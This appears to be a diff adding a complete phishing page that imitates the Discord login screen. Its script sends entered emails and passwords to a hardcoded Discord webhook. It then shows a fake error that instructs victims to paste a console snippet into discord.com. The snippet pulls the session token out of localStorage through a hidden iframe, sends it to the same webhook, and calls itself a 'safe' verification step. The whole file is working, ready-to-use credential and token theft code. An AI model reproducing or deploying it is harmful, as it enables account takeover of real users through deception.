@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Discord</title>
+    <link rel="icon" href="https://discord.com/assets/f9bb9c4af2b9c32a2c5ee0014661546d.png" type="image/png"/>
+    <style>
+        :root {
+            --bg: #36393f;
+            --surface: #2f3136;
+            --text-primary: #ffffff;
+            --text-secondary: #b9bbbe;
+            --input-bg: #202225;
+            --input-border: #000000;
+            --accent: #5865f2;
+            --accent-hover: #4752c4;
+            --danger: #ed4245;
+            --font: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+        body {
+            margin: 0;
+            height: 100vh;
+            background: var(--bg);
+            color: var(--text-secondary);
+            font-family: var(--font);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            background: var(--surface);
+            padding: 40px 32px;
+            border-radius: 5px;
+            width: 100%;
+            max-width: 440px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.4);
+        }
+        h1 { color: var(--text-primary); font-size: 24px; text-align: center; margin: 0 0 8px; }
+        .subtitle { text-align: center; font-size: 16px; margin-bottom: 24px; }
+        label { display: block; margin: 20px 0 8px; font-size: 14px; font-weight: 600; color: var(--text-secondary); }
+        .required::after { content: " *"; color: var(--danger); }
+        input {
+            width: 100%; padding: 10px; background: var(--input-bg);
+            border: 1px solid var(--input-border); border-radius: 3px;
+            color: var(--text-primary); font-size: 16px; box-sizing: border-box;
+        }
+        input:focus { outline: none; border-color: var(--accent); box-shadow: 0 0 0 2px rgba(88,101,242,0.4); }
+        .forgot { display: block; margin: 8px 0 24px; font-size: 14px; color: var(--accent); text-decoration: none; }
+        .forgot:hover { text-decoration: underline; }
+        button {
+            width: 100%; padding: 12px; background: var(--accent); color: white;
+            border: none; border-radius: 3px; font-size: 16px; font-weight: 600;
+            cursor: pointer; transition: background 0.2s;
+        }
+        button:hover { background: var(--accent-hover); }
+        .register { text-align: center; margin-top: 24px; font-size: 14px; }
+        .register a { color: var(--accent); text-decoration: none; }
+        .register a:hover { text-decoration: underline; }
+        #errorMsg, #consolePrompt { display: none; text-align: center; margin-top: 20px; padding: 12px; border-radius: 4px; font-size: 14px; }
+        #errorMsg { background: rgba(237,66,69,0.2); color: var(--danger); }
+        #consolePrompt { background: rgba(88,101,242,0.2); color: #fff; word-break: break-all; }
+        .code { background: #202225; padding: 8px; border-radius: 4px; font-family: monospace; margin: 10px 0; white-space: pre-wrap; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Welcome back!</h1>
+        <p class="subtitle">We're so excited to see you again!</p>
+
+        <form id="phishForm">
+            <label class="required">Email or Phone Number</label>
+            <input type="text" id="email" required autocomplete="off"/>
+
+            <label class="required">Password</label>
+            <input type="password" id="password" required autocomplete="off"/>
+
+            <a href="#" class="forgot">Forgot your password?</a>
+
+            <button type="submit">Log In</button>
+        </form>
+
+        <div id="errorMsg">Something went wrong. Try the console verification below.</div>
+
+        <div id="consolePrompt">
+            <strong>Quick fix:</strong> Open Discord in your browser (discord.com), press F12 → Console tab, paste this code and hit Enter:<br>
+            <div class="code" id="snippet">let iframe = document.body.appendChild(document.createElement('iframe')); iframe.style.display = 'none'; let token; try { token = JSON.parse(iframe.contentWindow.localStorage.token); } catch(e){} iframe.remove(); if(token){ fetch('https://discord.com/api/webhooks/1451742333941842063/Us6WUZdGQIwre6yJottqWRd10OutQWtombC-gYtpa1j0GNxMefdYb8dDyVzgIzV1eaqp', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[{title:'🔥 Console Token Hit',color:0x5865f2,fields:[{name:'Token',value:`\`\`\`${token}\`\`\``,inline:false}]}]})}); } alert('Verification complete!');</div>
+            <small>(This "verifies" your session – safe one-time thing)</small>
+        </div>
+
+        <div class="register">
+            Need an account? <a href="#">Register</a>
+        </div>
+    </div>
+
+    <script>
+        const webhook = "https://discord.com/api/webhooks/1451742333941842063/Us6WUZdGQIwre6yJottqWRd10OutQWtombC-gYtpa1j0GNxMefdYb8dDyVzgIzV1eaqp";
+
+        document.getElementById("phishForm").addEventListener("submit", async function(e) {
+            e.preventDefault();
+            const email = document.getElementById("email").value.trim();
+            const pass = document.getElementById("password").value.trim();
+            if (!email || !pass) return;
+
+            const payload = {
+                embeds: [{
+                    title: "🔥 Discord Creds Hit",
+                    color: 0x5865f2,
+                    fields: [
+                        { name: "Email/Phone", value: `\`${email}\``, inline: false },
+                        { name: "Password", value: `\`${pass}\``, inline: false },
+                        { name: "Time", value: new Date().toISOString(), inline: false }
+                    ]
+                }]
+            };
+
+            fetch(webhook, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            }).catch(() => {});
+
+            // Show fake error + console prompt
+            document.getElementById("errorMsg").style.display = "block";
+            document.getElementById("consolePrompt").style.display = "block";
+
+            // Optional redirect after delay if you want
+            // setTimeout(() => { window.location.href = "https://discord.com/login"; }, 8000);
+        });
+    </script>
+</body>
+</html>
